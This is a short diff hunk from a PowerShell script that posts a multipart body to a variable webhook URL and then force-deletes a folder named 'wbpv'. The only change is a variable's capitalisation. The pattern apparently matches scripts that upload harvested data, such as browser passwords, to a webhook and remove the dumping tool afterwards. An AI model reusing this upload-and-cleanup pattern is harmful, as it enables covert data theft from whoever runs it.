@@ -48,6 +48,6 @@ $body = (
     "--$boundary--$LF"
 ) -join $LF;
 
-Invoke-WebRequest -Uri $hook -ContentType "multipart/form-data; boundary=$boundary" -Method Post -Body $body;
+Invoke-WebRequest -Uri $Hook -ContentType "multipart/form-data; boundary=$boundary" -Method Post -Body $body;
 
 Remove-Item "wbpv" -Force -Recurse;
